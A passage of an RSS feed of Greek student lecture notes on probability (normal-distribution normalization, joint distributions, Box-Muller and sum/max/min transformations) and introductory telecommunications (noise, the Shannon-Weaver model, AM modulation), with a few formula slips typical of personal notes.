<h4 id="orgc1d3f95"><span class="section-number-4">3.1.1.</span> <a href="#orgc1d3f95">Μετασχηματισμός μεταβλητής με κανονική κατανομή</a></h4>
<div class="outline-text-4" id="text-3-1-1">
<p>
Έστω ότι έχουμε τμ \(X\) που ακολουθεί κανονική κατανομή:
</p>
\begin{equation}
\label{eq:5}
X\sim N(\mu,\sigma^2)\\
\end{equation}

<p>
τότε:
</p>
\begin{equation}
\label{eq:16}
Y = aX +b \Rightarrow Y \sim N(\alpha\mu +b, \alpha\sigma)
\end{equation}
</div>
</div>
<div id="outline-container-orge6cae31" class="outline-4">
<h4 id="orge6cae31"><span class="section-number-4">3.1.2.</span> <a href="#orge6cae31">Κανονικοποίηση</a></h4>
<div class="outline-text-4" id="text-3-1-2">
<ul class="org-ul">
<li>Αν δεν έχεις διαβάσει προηγουμένως μια μαθηματική ανάλυση (έστω την επόμενη
παράγραφο) ίσως το αντικείμενο αυτής δεν είναι τόσο ξεκάθαρο.</li>
<li>Η ΑΣΚ της κανονικής κατανομής έχει την μορφή:</li>
</ul>

\begin{equation}
\label{eq:6}
F_X(x) = \int_{-\infty}^xf_x(r)dr = \cdots =
\frac{1}{\sqrt{2\pi}}\int_{-\infty}^{\frac{x-\mu}{\sigma}}e^{- \frac{u^2}{2}}du = \Phi(\frac{x-\mu}{\sigma})
\end{equation}

<ul class="org-ul">
<li>Το ολοκλήρωμα είναι μόνο αριθμητικά υπολογίσιμο, αναγκάζοντας μας να στραφούμε
σε πίνακες για τον υπολογισμό του.</li>
<li>Την ίδια στιγμή, παρατηρώντας την παραπάνω σχέση προκύπτει πως η ΑΣΚ μιας
οποιασδήποτε τμ \(X\sim N(\mu,\sigma^2)\) ανάγεται στην ΑΣΚ της \(N(0,1)\)</li>
<li>Οπότε μπορούμε να πούμε ότι <i>κανονικοποιούμε</i> την κανονική  κατανομή υιοθετώντας
την σχέση \(z = \frac{x-\mu}{\sigma}\)</li>
</ul>
</div>
</div>
<div id="outline-container-orgaef8c54" class="outline-4">
<h4 id="orgaef8c54"><span class="section-number-4">3.1.3.</span> <a href="#orgaef8c54">Σχέση με \(\Phi\)</a></h4>
<div class="outline-text-4" id="text-3-1-3">
<p>
Ορίζουμε συνάρτηση
</p>
\begin{equation}
\label{eq:7}
\Phi(x) =\frac{1}{\sqrt{2\pi}} \int_{-\infty}^x e^{- \frac{u^2}{2}}du 
\end{equation}
<p>
όπως άλλωστε είδαμε και στην προηγούμενη παράγραφο. Έχουμε έτσι:
</p>
\begin{equation}
\label{eq:8}
F_X(x) = \Phi(
\frac{x-\mu}{\sigma^{2}})
\end{equation}

<p>
Ισχύει η ιδιότητα:
</p>
\begin{equation}
\label{eq:9}
\Phi(-x) = 1 - \Phi(x)
\end{equation}


<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Προς ανάπτυξη: Ροπογεννήτρια συνάρτηση και \(\Phi\) όπως την είδαμε εδώ.</li>
</ul>
</div>
</div>
<div id="outline-container-org9b9ba4c" class="outline-4">
<h4 id="org9b9ba4c"><span class="section-number-4">3.1.4.</span> <a href="#org9b9ba4c">Σχέση με Gaussian \(Q\)</a></h4>
<div class="outline-text-4" id="text-3-1-4">
<p>
Ορίζουμε συνάρτηση:
</p>
\begin{equation}
\label{eq:10}
Q(x) = 1 - \Phi(x)
\end{equation}

<p>
της οποίας η εφαρμογή στα τηλεπικοινωνιακά συστήματα υπογραμμίζεται στο βιβλίο
των Καραγιαννίδη, Χατζηδιαμαντή. Δεν αναλύθηκε ιδιαίτερα στην διάλεξη, πέραν από
την σύνδεσή της με την συνάρτηση λάθους
</p>

\begin{equation}
\label{eq:11}
erfc = \text{complimentary }erf(x) = 1 - erf(x) = 2Q(\sqrt{2}x)
\end{equation}

<p>
Ακόμα, μέσω αυτής ορίζονται ουσιαστικά τα <a href="posts/lectures/auth/ssd/lec_SSD_20221017.html#org28b6ee8">Όρια Chernoff - Rubin</a>
</p>
</div>
</div>
</div>
<div id="outline-container-org2bfec29" class="outline-3">
<h3 id="org2bfec29"><span class="section-number-3">3.2.</span> <a href="#org2bfec29">Εκθετική κατανομή</a></h3>
<div class="outline-text-3" id="text-3-2">
<ul class="org-ul">
<li>Πολύ σημαντικές ιδιότητες:</li>
</ul>

\begin{align}
\label{eq:1}
Pr\{X>a+b\} &= Pr\{X>a\}Pr\{X>b\}\\
Pr\{X>a+b|X>a\} &= Pr\{X>b\}
\end{align}
<ul class="org-ul">
<li>η δεύτερη ιδιότητα λέγεται memoryless property</li>
</ul>
</div>
</div>
<div id="outline-container-org9e4f066" class="outline-3">
<h3 id="org9e4f066"><span class="section-number-3">3.3.</span> <a href="#org9e4f066">Erlang</a></h3>
<div class="outline-text-3" id="text-3-3">
<ul class="org-ul">
<li>Όπως γράφει και παραπάνω, χρήσιμη όταν μας ενδιαφέρει ο χρόνος μεταξύ \(k\)
διαδοχικών γεγονότων και όχι μόνο δύο, στην οποία περίπτωση και χρησιμοποιούμε
την εκθετική κατανομή.</li>
<li>Αναφέρθηκε το παράδειγμα της ουράς σουπερμαρκετ, αυξανόμενου αριθμού πελατών.</li>
</ul>
</div>
</div>
<div id="outline-container-orgfaa53a7" class="outline-3">
<h3 id="orgfaa53a7"><span class="section-number-3">3.4.</span> <a href="#orgfaa53a7">Ακόμα</a></h3>
<div class="outline-text-3" id="text-3-4">
<p>
Αναφερθήκαμε συνοπτικά σε
</p>
<ul class="org-ul">
<li>Rayleigh</li>
<li>Weibull</li>
</ul>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Τώρα να ρωτήσει κανείς <b>γιατί δεν λέγεται η Πασκάλ υπεργεωμετρική και
λέγεται αρνητική διωνυμική?</b>
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Ακόμα, εξ&rsquo; ορισμού ισχύει: \(\sum_{i=1}^z N_i = N\)
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη 6: Μεταχηματισμοί Τυχ Μεταβλητών</title>
<link>posts/lectures/auth/ssd/lec_SSD_20221102.html</link>
<pubDate>Wed, 02 Nov 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/ssd/lec_SSD_20221102.html</guid>
<description>
<![CDATA[<style>
div.paradeigma::before {
    content: "Παράδειγμα"; color: var(--accent-color); text-decoration-line: underline;
}
div.paradeigma {
    background: var(--code-background-color);
    border: 2px solid var(--accent-color);
    margin-top: 2em; margin-bottom: 2em; padding: 2em;
}
</style>

<p>
Έχασα την προηγούμενη διάλεξη. Σε περίπτωση που τα διαβάζει κανείς σε σειρά ίσως
υπάρξουν κενά.Έχω προσπαθήσει να το καλύψω με προσωπική μελέτη, μα είναι
εξαιρετικά πιθανό να λείπουν σημαντικές λεπτομέρειες.
</p>

<p>
Συγκεκριμένα η πρώτη ενότητα (<a href="#orgad17cf8">Μοντέλο πολλαπλών τυχαίων μεταβλητών</a>) μπήκε κατ&rsquo;
αποκλειστικότητα για συμπλήρωση των υπολοίπων.
</p>
<div id="outline-container-orgad17cf8" class="outline-2">
<h2 id="orgad17cf8"><span class="section-number-2">1.</span> <a href="#orgad17cf8">Μοντέλο πολλαπλών τυχαίων μεταβλητών.</a></h2>
<div class="outline-text-2" id="text-1">
<div class="note" id="orgf720944">
<p>
&rsquo;Έξυπνη&rsquo; η μελέτη από Πανά:
</p>
<ul class="org-ul">
<li>pg 36-40</li>
<li>pg 72-77</li>
</ul>

</div>

<p>
Μελετήσαμε και είδαμε τι γίνεται αν το αποτέλεσμα ενός πειράματος μπορεί να
περιγραφεί από μία τυχαία μεταβλητή, ορίζοντας έτσι κατάλληλα τις CDF, PDF.
Πολλά όμως πειράματα χρειάζονται περισσότερες τμ για την περιγραφή τους,
καθιστώντας την μέχρι τώρα μελέτη κάπως ανεπαρκή.
</p>

<p>
Χαρακτηριστικά, το στοχαστικό σήμα <i>χρειάζεται/εκμεταλλέυεται</i> άπειρες τμ.
</p>
</div>
<div id="outline-container-orgf99ce00" class="outline-3">
<h3 id="orgf99ce00"><span class="section-number-3">1.1.</span> <a href="#orgf99ce00">Επέκταση για δυο τυχαίες μεταβλητές</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Έστω λοιπόν ότι οι μεταβλητές \(X,Y\) συνδέονται με το αποτέλεσμα του πειράματος
και χρειαζόμαστε την πιθανότητα:
</p>
\begin{equation}
\label{eq:6}
\text{Pr}\left[X\leq x, Y\leq y\right]
\end{equation}

<p>
Τότε, βάση όσων έχουμε δει \(\text{Pr}\left[X\leq x\right] = F_x(x)\), αναμενόμενα
θέλουμε την <span class="underline">κοινή</span> cdf των δύο τμ, η οποία λέγεται και <b>JCDF</b> (joint CDF):
</p>

\begin{equation}
\label{eq:7}
\text{Pr}\left[X\leq x, Y\leq y\right] = F_{XY}(x,y) 
\end{equation}

<p>
Για την οποία ισχύουν οι αναμενόμενες από την απλή CDF ιδιότητες.
</p>

<div class="note" id="orgeed5ba3">
<p>
Τόσο η JCDF όσο και η JPDF μπορούν εύκολα να γίνουν εικόνα ως <i>τομές</i> υποχώρων.
</p>

</div>

<p>
Με παρόμοιο τρόπο ορίζεται και η <b>JPDF</b> (joint PDF):
</p>
\begin{equation}
\label{eq:8}
f_x(x) = \frac{d{F_x}}{d{x}} \stackrel{JPDF}{\Rightarrow} f_{XY}(x,y) = \frac{\partial^2{F_{XY}}}{\partial{x}\partial{x}}
\end{equation}
<p>
ή αντίστροφα:
</p>
\begin{equation}
\label{eq:9}
F_{XY}(x,y) = \int_{-\infty}^x\int_{-\infty}^y f_{XY}(x,y)dydx
\end{equation}

<p>
Όπως και για την JCDF, οι ιδιότητες της JPDF είναι πλήρως αναμενόμενες από την
μελέτη της απλής CDF, όπως για παράδειγμα η:
</p>

\begin{equation}
\label{eq:10}
\text{Pr}\left[ x_1 < X\leq x_2, y_1< Y\leq y_2\right] = \int_{x_1^+}^{x_2}\int_{y_1+}^{y_2} f_{XY}(x,y)dydx
\end{equation}
</div>
<ol class="org-ol">
<li><a id="orge768ccb"></a><a href="#orge768ccb">Ροπές</a><br>
<div class="outline-text-5" id="text-1-1-0-1">
<p>
Παράλληλα, όπως αλλάζουν οι CDF, PDF, είναι αναμενόμενο πως θα χρειαστεί να
ορίσουμε με διαφορετικό τρόπο και τις ροπές.
</p>

<p>
Η ροπή $n$οστής τάξης στο μοντέλο 2 τυχαίων μεταβλητών ορίζεται ως εξής:
</p>
\begin{equation}
\label{eq:11}
m_{kr} = E[X^kY^r] = \int_{-\infty}^{\infty} \int_{-\infty}^{\infty} x^ky^rf_{XY}(x,y)dxdy
\end{equation}

<p>
όπου η τάξη της ροπής ισούται με το άθροισμα \(n\) των εκθετών (\(n=k,r\))
Αντίστοιχα οι κεντρικές ροπές ορίζονται μέσω της:
</p>
\begin{equation}
\label{eq:12}
\mu_{kr} = E[(X-\bar{X})^k(Y-{\bar Y})^r] = \int_{-\infty}^{\infty}\int_{-\infty}^{\infty} (x-\bar{X})^k(y-{\bar Y})^rdxdy
\end{equation}

<p>
Όπως εύκολα αποδεικνύεται \(m_{10}= {\bar X}\), \(m_{01} = {\bar Y}\)
</p>
</div>
</li>
<li><a id="org2ddcd7f"></a><a href="#org2ddcd7f">Συσχέτιση και συντελεστής συσχέτισης.</a><br>
<div class="outline-text-5" id="text-1-1-0-2">
<p>
Εκ των ροπών όμως είναι μερικές που /ξεχωρίζουν:οι \(m_{11}\),\(\mu_{11}\), αλλιώς
<b>συσχέτιση και συμμεταβλητότητα</b>.
</p>
<ul class="org-ul">
<li>Η συσχέτιση αποτελεί δείκτη αλληλοεξάρτησης των \(X,Y\), όπως άλλωστε και η
συμμεταβλητότητα (της αλληλοεξάρτησης των \(X,Y\) κατόπιν της αφαίρεσης της
μέσης τιμής)</li>
<li>Αν \(m_{11}=0\) ή \(\mu_{11}=0\) τότε ισχύει \(m_{11}= \mu_{11} =0\)</li>
</ul>

<p>
Σε αυτό το πλαίσιο μπορούμε να ορίσουμε τον συντελεστή συσχέτισης (ή αλλιώς
<i>κανονικοποιημένη συμμεταβλητότητα</i>)
</p>
\begin{equation}
\label{eq:13}
\rho = E[\frac{X-{\bar X}}{\sigma_x}, \frac{Y-{\bar Y}}{\sigma_y}] = E[Z\Theta]
\end{equation}

<p>
Εναλλακτικά μπορεί να γραφεί ως:
</p>
\begin{equation}
\label{eq:14}
\rho \stackrel{\text{cov = covariance}}{=} \frac{\text{cov}[x,y]}{\sigma_{x}\sigma_{y}} = 
\frac{E[(X-{\bar X})(Y-{\bar Y})]}{\sqrt{Var[X]Var[Y]}}
\end{equation}
<p>
ενώ ακόμα παρατίθονται οι:
</p>
\begin{align}
\label{eq:15}
-1\leq \rho \leq 1\\
\frac{m_{11}^2}{m_x^2-m_y^2} \leq 1
\end{align}
</div>
</li>
<li><a id="orgd0c7000"></a><a href="#orgd0c7000">Χαρακτηριστική εξίσωση στο μοντέλο πολλών τμ:</a><br>
<div class="outline-text-5" id="text-1-1-0-3">
\begin{equation}
\label{eq:16}
\Phi_{X}(\omega) = E[e^{j\omega x}] = \int_{-\infty}^{\infty} e^{j\omega x}f_x(x)dx \stackrel{JPDF}{\Rightarrow} \Phi_{XY}(\omega_1,\omega_2) = E[e^{j(\omega_1x+\omega_2y)}] = \cdots
\end{equation}
</div>
</li>
</ol>
</div>
<div id="outline-container-org944c581" class="outline-3">
<h3 id="org944c581"><span class="section-number-3">1.2.</span> <a href="#org944c581">Για ν τυχαίες μεταβλητές</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
Τα παραπάνω εύκολα ανάγονται για οποιονδήποτε αριθμό τυχαίων μεταβλητών.
</p>
</div>
</div>
</div>
<div id="outline-container-orgfa32904" class="outline-2">
<h2 id="orgfa32904"><span class="section-number-2">2.</span> <a href="#orgfa32904">Μετασχηματισμοί σε μοντέλλο πολλαπλών τμ</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Δοθείσης της τμ \(Z=g(X,Y)\), και του μοντέλου \((X,Y,f_{XY}(x,y))\) ζητείται να
βρουμε ποιο είναι το μοντέλο \((Z,f_Z)\):
</p>
</div>
<div id="outline-container-org095ac46" class="outline-3">
<h3 id="org095ac46"><span class="section-number-3">2.1.</span> <a href="#org095ac46">Μετασχηματισμός JCDF</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Την \(F_z(z)\) μπορούμε να την βρούμε σχετικά εύκολα μέσω της:
</p>
\begin{equation}
\label{eq:17}
F_z(z)=
\text{Pr}\left[Z\leq z\right] = 
\text{Pr}\left[g(X,Y) \leq z\right] =
\text{Pr}\left[(X,Y) \in  D_z\right] = \iint_{(x,y)\in D_z}f_{xy}(x,y)dxdy
\end{equation}
</div>
</div>
<div id="outline-container-org6e10143" class="outline-3">
<h3 id="org6e10143"><span class="section-number-3">2.2.</span> <a href="#org6e10143">Μετασχηματισμός JPDF</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Για την \(f_z(z)\), όμως, χρειάζεται να ακολουθήσουμε διαφορετική προσέγγιση:
</p>

<p>
Θέτουμε \(W=h(X,Y)\) νέα τυχαία μεταβλητή (συχνά βολεύει \(W=X\) ή \(W=Y\)) ώστε να
υπολογίσουμε την \(f_{ZW}(z,w)\) και μετά να <i>γυρίσουμε</i> στην \(f_z\) μέσω της
ιδιότητας:
</p>
\begin{equation}
\label{eq:18}
f_x(x) = \int_{-\infty}^{\infty}f_{xy}(x,y)dy
\end{equation}

<p>
Έχουμε:
</p>
\begin{equation}
\label{eq:19}
f_{ZW}(z,w) = \sum_{i=1}^n \frac{f_{XY(x,y)}}{|J(x,y)|}|_{x=x_i,y=y_i}
\end{equation}

<p>
με \(J(x,y)\), την ιακωβιανή ορίζουσα:
</p>
\begin{equation}
\label{eq:20}
J(x,y) = 
\begin{vmatrix}
\frac{\partial{g}}{\partial{x}} && \frac{\partial{g}}{\partial{y}}\\
\frac{\partial{h}}{\partial{x}} && \frac{\partial{h}}{\partial{y}}\\
\end{vmatrix}
\end{equation}

<div class="note" id="org3ccd5b6">
<p>
Προφανώς αυτό πρόκειται για υποπερίπτωση, του να θέλεις να πας από το
\((X,Y,f_{XY})\to (Z,\Theta,f_{z\theta})\), όπου \(Z=g(X,Y),\Theta=h(X,Y)\)
</p>

</div>

<div class="paradeigma" id="org35346af">
<p>
Έστω ότι μας δίνεται η παρακάτω \(f\) και θέλουμε να πάμε από \((X,Y,f_{XY})\to(Z,W,f_{ZW})\)
</p>
\begin{align}
\label{eq:1}
f_{xy} = \begin{cases}
1 & 0\leq x,y \leq 1\\
0
\end{cases}
\end{align}

<ul class="org-ul">
<li>Πρόσεξε ότι δεν πρόκειται για κύκλο στο επίπεδο (βιάστηκα όταν το είχα δει
βιαστικά). Είναι οτι και καλά \(x,y\) ανεξάρτητες και ακολουθούν ομοιομορφη
κατανομή στο \([0,1]\)</li>
</ul>

<p>
Ενώ παράλληλα δίνεται:
</p>
\begin{align}
\label{eq:2}
Z &= g(X,Y) = \sqrt{-2\ln{x}}\cos{2\pi Y}\\
W &= h(X,Y) = \sqrt{-2\ln{x}}\sin{2\pi Y}
\end{align}

<p>
Οπότε για να το υπολογίσουμε χρειάζεται:
</p>
<ol class="org-ol">
<li>Υπολογισμός των X,Y συναρτήσει των νέων μεταβλητών</li>
</ol>
\begin{align*}
X &= \cdots = e^{- \frac{z^2+w^2}{2}}\\
Y &= \cdots = \frac{1}{2\pi} \arctan{\frac{w}{2}}
\end{align*}

<ol class="org-ol">
<li>Υπολογισμός της Ιακωβιανής ορίζουσας</li>
</ol>

\begin{equation}
\label{eq:4}
J(x,y)=
\begin{vmatrix}
\frac{\cos{2\pi Y}}{X\sqrt{-2\ln{X}}}& -2\pi\sqrt{-2\ln{X}}\sin{2\pi Y}\\
\frac{\sin{2\pi Y}}{X\sqrt{-2\ln{X}}}& 2\pi\sqrt{-2\ln{X}}\cos{2\pi Y}\\
\end{vmatrix} = \cdots =
\frac{-2\pi}{X}
\end{equation}

<ol class="org-ol">
<li>Εφαρμογή του θεωρήματος επί της CDF, zw:</li>
</ol>


\begin{equation}
\label{eq:5}
f_{ZW} = 
\frac{f_{xy}(x,y)}{|J(x,y)|}|_{x=\cdots, y=\cdots} = 
\frac{e^{- \frac{z^2+w^2}{2}}}{2\pi}
\end{equation}

<p>
Αυτός ο μετασχηματισμός <b>(Box-Mueller)</b>, δείχνει πως απο τυχαίες μεταβλητές που
ακολουθούν ομοιόμορφη κατανομή να παράξω εξαρτημένες που ακολουθούν Gauss
</p>

</div>

<div class="paradeigma" id="orgc7b999c">
<p>
Γνωρίζουμε το μοντέλο \((X,Y,f_{XY})\), και θέλουμε να πάμε στο \((Z,f_z)\) όπου ισχύει:
\(Z = X+Y\)
</p>
<ol class="org-ol">
<li>Θέτουμε δεύτερη μεταβλητή \(W=X\)</li>
<li>Εκφράζουμε \(X,Y\) συναρτήσει των \(Z,W\) (\(X=W,Y=Z-W\))</li>
<li>Υπολογίζουμε την Ιακωβιανή ορίζουσα \(J_{ZW} = -1\)</li>
<li>Υπολογίζουμε την \(f_{ZW}\) με τον γνωστό τύπο \(\eqref{eq:19}\)</li>
</ol>
\begin{equation*}
f_{ZW}(z,w) = \frac{f_{XY}}{|J_{ZW}|}|_{x=w,y=z-w}
\end{equation*}
<ol class="org-ol">
<li>Δεδομένου ότι \(f_{XY}=f_Xf_Y\) αντικαθιστούμε στην παραπάνω εξίσωση και τελικά προκύπτει από την \(\eqref{eq:18}\):</li>
</ol>
\begin{equation}
\label{eq:21}
f_Z(z) = f_X(z)*f_Y(z)
\end{equation}

</div>


<div class="paradeigma" id="org7c13fec">
<p>
Για \(Z=max(X,Y)\)
</p>
\begin{equation}
\label{eq:22}
F_Z(z) = 
\text{Pr}\left[max(X,Y) \leq z\right] =
\text{Pr}\left[X \leq z, Y\leq z\right] =
\text{Pr}\left[X \leq z\right] \text{Pr}\left[Y \leq z\right] = F_X(z)F_Y(z)
\end{equation}

</div>


<div class="paradeigma" id="org07ed69f">
<p>
Για \(Z=min(X,Y)\)
</p>
\begin{equation}
\label{eq:23}
F_Z(z) = 
\text{Pr}\left[min(X,Y)\leq z\right]=
\text{Pr}\left[(X\leq z)\cup (Y\leq z)\right] =
\text{Pr}\left[X\leq z\right] +
\text{Pr}\left[Y\leq z\right] -
\text{Pr}\left[(X\leq z)\cap (Y\leq z)\right] =
F_X(z) + F_Y(z)
\end{equation}

</div>
</div>
</div>
<div id="outline-container-org9d0266a" class="outline-3">
<h3 id="org9d0266a"><span class="section-number-3">2.3.</span> <a href="#org9d0266a">Εύρεση με μετασχηματισμό μίας μεταβλητής και υπο συνθήκη πιθανότητες</a></h3>
<div class="outline-text-3" id="text-2-3">
<ul class="org-ul">
<li>Ιδιαίτερα χρήσιμος όταν είσαι με πολλαπλασιασμό. Θέτεις την μία εκ των δύο
τυχαίων μεταβλητών σε σταθερά. Έστω δηλαδή</li>
</ul>


\begin{align*}
Z =& XY\\
X = x &\longrightarrow Z = xY.
\end{align*}

<p>
Έτσι ανάγεις τον μετασχηματισμό 2 τμ σε μετασχηματισμό μόνο μίας. Χρησιμοποιείς
τον παλιό ήδη γνωστό τύπο. 
Έτσι μπλέκεις με δεσμευμένες πιθανότητες
</p>

\begin{equation}
\label{eq:3}
f_{Z|X}(Z|X=x) = \frac{f_{Y|X}(Y|x)}{|x|}|_{y= \frac{Z}{x}}
\end{equation}

<p>
Και κατόπιν ολοκληρώνεις ως προς όλες τις τιμές που μπορεί να λάβει το \(x\)
</p>

\begin{equation}
\label{eq:24}
f_z(z) = \int_{-\infty}^{\infty}f_{Z|X}(z|X=x)f_X(x)dx
\end{equation}
</div>
</div>
</div>
<div id="outline-container-org68f6918" class="outline-2">
<h2 id="org68f6918"><span class="section-number-2">3.</span> <a href="#org68f6918">Εισαγωγή σε κατανομές πολλαπλών τμ:</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Η ανάλυση που κάναμε μέχρι στιγμές επεκτείνεται <b>με την χρήση διανυσμάτων</b> για \(n\)
τυχαίες μεταβλητές. 
</p>

<p>
Η διάλεξη σταμάτησε εδώ.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη: 1 Εισαγωγική</title>
<link>posts/lectures/auth/tlp1/lec_TLP1_20221003.html</link>
<pubDate>Mon, 03 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/tlp1/lec_TLP1_20221003.html</guid>
<description>
<![CDATA[<p>
:ID: lec-TLP1-intro
</p>
<div class="definition" id="org8df3390">
<p>
Τεχνικό και όχι μαθηματικά.
</p>

</div>
<div id="outline-container-orgdedc94d" class="outline-2">
<h2 id="orgdedc94d"><span class="section-number-2">1.</span> <a href="#orgdedc94d">Σύνοψη</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Εισαγωγικό μάθημα, δεν θεωρώ πως είχε κάτι το οποίο θα φανεί ουσιαστικά χρήσιμο
στις επόμενες διαλέξεις.
</p>
</div>
</div>
<div id="outline-container-org617efdf" class="outline-2">
<h2 id="org617efdf"><span class="section-number-2">2.</span> <a href="#org617efdf">Οι τηλεπικοινωνίες έχουν στοχαστική βάση</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Γιατί αυτό; Γιατί ο θόρυβος αποτελεί στοχαστικό φαινόμενο.
</p>
</div>
</div>
<div id="outline-container-orgb9dd413" class="outline-2">
<h2 id="orgb9dd413"><span class="section-number-2">3.</span> <a href="#orgb9dd413">Διάκριση θορύβου παρεμβολής</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Αν και οι παρεμβολές αποτελούν υποκατηγορία του θορύβου εκείνος θεωρούμε
γενικότερα πως οφείλεται στα ηλεκτρονικά κυκλώματα.
</p>
</div>
<div id="outline-container-org71cf512" class="outline-3">
<h3 id="org71cf512"><span class="section-number-3">3.1.</span> <a href="#org71cf512">Θερμικός θόρυβος και ψύξη συστημάτων:</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Ο θόρυβος συχνά είναι θερμικός (που σημαίνει ότι είναι ανάλογος της ανόδου της
θερμοκρασίας του κυκλώματος). Για αυτό και σε συστήματα όπως εκείνα των server
είναι απαραίτητη η κατάλληλη ψύξη
</p>
</div>
</div>
</div>
<div id="outline-container-orgcdf6e4c" class="outline-2">
<h2 id="orgcdf6e4c"><span class="section-number-2">4.</span> <a href="#orgcdf6e4c">Περί αναλογικής και ψηφιακής τηλεόρασης</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Κατά την μετάβαση από την αναλογική στην ψηφιακή τηλεόραση επιτεύχθηκε καλυτερη
ποιότητα και QoS. Αυτή η διαφορά οφείλεται στις διαμορφώσεις (modulations):
αναλογικές και ψηφιακές αντίστοιχα, οι οποίες επιτρέπουν τον περιορισμό του
πλήθους καταστάσεων της εικόνας. Αναλυτικότερα: στις αναλογικές έχουμε άπειρο
αριθμό καταστάσεων ενώ στις ψηφιακές περιορισμένο (σχέση συνεχούς διακριτού
σήματος). Αυτή η ιδιότητα κάνει τις ψηφιακές τηλεοράσεις να αντιμετωπίζουν τον
θόρυβο πολύ καλύτερα.
</p>
</div>
</div>
<div id="outline-container-org61b232d" class="outline-2">
<h2 id="org61b232d"><span class="section-number-2">5.</span> <a href="#org61b232d">Παρουσίαση 5g to 6g</a></h2>
<div class="outline-text-2" id="text-5">
<ul class="org-ul">
<li>Αρχικά έγινε μια σύγκριση των δυο διαφορετικών <i>σχολών</i> της επικοινωνίας:
εκείνης εστιασμένης στην αποδοτική μεταφορά των μηνυμάτων (Shannon-Weaver) και
σε εκείνη που αφορά το αποδοτικό περιεχόμενό τους (Umberto Eco)</li>
</ul>
</div>
<div id="outline-container-orge597de2" class="outline-3">
<h3 id="orge597de2"><span class="section-number-3">5.1.</span> <a href="#orge597de2">Μοντέλο Shannon-Weaver</a></h3>
<div class="outline-text-3" id="text-5-1">
<ul class="org-ul">
<li><a href="https://www.communicationtheory.org/shannon-and-weaver-model-of-communication/">https://www.communicationtheory.org/shannon-and-weaver-model-of-communication/</a></li>
</ul>
<ul class="org-ul">
<li>Αποστολέας -&gt; Encoder -&gt; Channel -&gt; Decoder -&gt; Receiver</li>
<li>Προφανώς μπορεί να λειτουργήσει ταυτόχρονα και προς τις δυο πλευρές (
half-duplex vs full-duplex)</li>
<li>Κρίσιμες έννοιες:
<ul class="org-ul">
<li>Θόρυβος</li>
<li>Εντροπία.</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org98a4ea3" class="outline-3">
<h3 id="org98a4ea3"><span class="section-number-3">5.2.</span> <a href="#org98a4ea3">Ιστορία των τηλεπικοινωνιών</a></h3>
<div class="outline-text-3" id="text-5-2">
<ol class="org-ol">
<li>Φρυκτώριες (αρχαία υλοποίηση) και αναμετάδοση οπτικού σήματος.
Χρησιμοποιούνταν ακόμα και στον 18ο αιώνα</li>
<li>Marconi
Ασύρματη επικοινωνία Αγγλίας Γαλλίας.</li>
<li>Hedy Lamarr (Hedwig Kiesler)
Ηθοποιός - ηλεκτρονικός η οποία βοήθησε στην βελτίωση <i>χειρισμού</i> σήματος με θόρυβο.</li>
<li>Claude Shannon 
Δόθηκε μεγάλη έμφαση</li>
</ol>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 3: AM: Διαμορφωτές και ασύμφωνοι αποδιαμορφωτές</title>
<link>posts/lectures/auth/tlp1/lec_TLP1_20221010.html</link>
<pubDate>Mon, 10 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/tlp1/lec_TLP1_20221010.html</guid>
<description>
<![CDATA[<div id="outline-container-org7b8827c" class="outline-3">
<h3 id="org7b8827c"><span class="section-number-3">0.1.</span> <a href="#org7b8827c">Προαπαιτούμενες γνώσεις</a></h3>
<div class="outline-text-3" id="text-0-1">
<p>
Για την πλήρη κατανόηση της διάλεξης είναι <i>απαραίτητη</i> η κατανόηση των δύο αυτών
εννοιών:
</p>
<ul class="org-ul">
<li>Περιβάλλουσα
<ul class="org-ul">
<li><a href="posts/lectures/auth/tlp1/lec_TLP1_20221012.html">Αναλύθηκε στην προηγούμενη διάλεξη</a></li>
</ul></li>
<li>Ισχύς και συντελεστής απόδοσης ισχύος.
<ul class="org-ul">
<li><a href="posts/lectures/auth/tlp1/lec_TLP1_20221012.html">Αναλύθηκε στην προηγούμενη διάλεξη</a></li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org56cfd23" class="outline-3">
<h3 id="org56cfd23"><span class="section-number-3">0.2.</span> <a href="#org56cfd23">Παράδειγμα σε ψηφιακές επικοινωνίες.</a></h3>
<div class="outline-text-3" id="text-0-2">
<div class="note" id="org470e0de">
<p>
Αυτή η υποπαράγραφος, η οποία έγινε ύπο την μορφή παραδείγματος στην τάξη
αποτελεί ουσιαστικά την εισαγωγή στο δεύτερο κομμάτι του μαθήματος, την
μετατροπή του αναλογικού σήματος σε ψηφιακό.
</p>

</div>

<p>
Στις ψηφιακές επικοινωνίες (αρχικά) μας ενδιέφερε η μεταφορά μόνο δύο
καταστάσεων, (0,1), ενώ προφανώς σταδιακά, προκειμένου να μπορούμε να
μεταφέρουμε μεγαλύτερο όγκο πληροφοριών, με πιο απαιτητικές ταχύτητες
αρχίσαμε να ενδιαφερόμαστε για μεγαλύτερες δυνάμεις του δύο.
</p>

<p>
Για να μετατρέψουμε ένα σήμα το οποίο έχει υποστεί διαμόρφωση πλάτους σε
